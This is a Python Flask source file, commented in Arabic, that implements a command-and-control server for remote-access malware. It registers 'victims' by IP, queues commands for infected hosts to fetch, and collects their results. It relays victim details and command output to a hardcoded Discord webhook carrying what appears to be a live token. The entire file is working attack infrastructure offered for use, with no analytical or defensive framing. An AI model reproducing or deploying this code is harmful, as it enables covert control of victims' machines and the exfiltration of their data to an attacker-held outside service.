from flask import Flask, request, jsonify
import requests, json, time, os
import uuid

app = Flask(__name__)

# ==========================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1561247907213086720/uM2sBufoeaXJvnyL3kJoe8eJLcaJ5nCfJ1elh0QIodJChuQHE9PFEmJ7Dy7zFMfm0-eo"
# ==========================================

VICTIMS = {} 
COMMANDS = {} 

@app.route('/new_victim', methods=['POST'])
def new_victim():
    data = request.json
    # توليد ID قصير (4 أرقام/حروف)
    vid = str(uuid.uuid4())[:4] 
    
    # في حال صار تعارض بالحظ (نادر جداً)، نعيد التوليد
    while vid in VICTIMS:
        vid = str(uuid.uuid4())[:4]

    VICTIMS[vid] = {"id": vid, "ip": data.get('ip'), "time": time.ctime()}
    
    msg = f"**New Victim Connected!** ☠️\n**ID:** `{vid}`\n**Host:** {data.get('ip')}\n**Time:** {time.ctime()}"
    requests.post(WEBHOOK_URL, json={"content": msg, "username": "M6RAB Command"})
    
    return jsonify({"status": "ok", "id": vid}), 200

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    vid = data.get('vid')
    cmd = data.get('cmd')
    arg = data.get('arg', '')
    COMMANDS[vid] = {"command": cmd, "arg": arg}
    return jsonify({"status": "sent"}), 200

@app.route('/check_command/<vid>', methods=['GET'])
def check_command(vid):
    if vid in COMMANDS:
        cmd_data = COMMANDS[vid]
        del COMMANDS[vid] 
        return jsonify(cmd_data), 200
    return jsonify({"command": "none", "arg": ""}), 200

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    vid = data.get('vid')
    result_text = data.get('result')
    
    msg = f"**Result from Victim {vid}**\n{result_text}"
    requests.post(WEBHOOK_URL, json={"content": msg, "username": "M6RAB Command"})
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
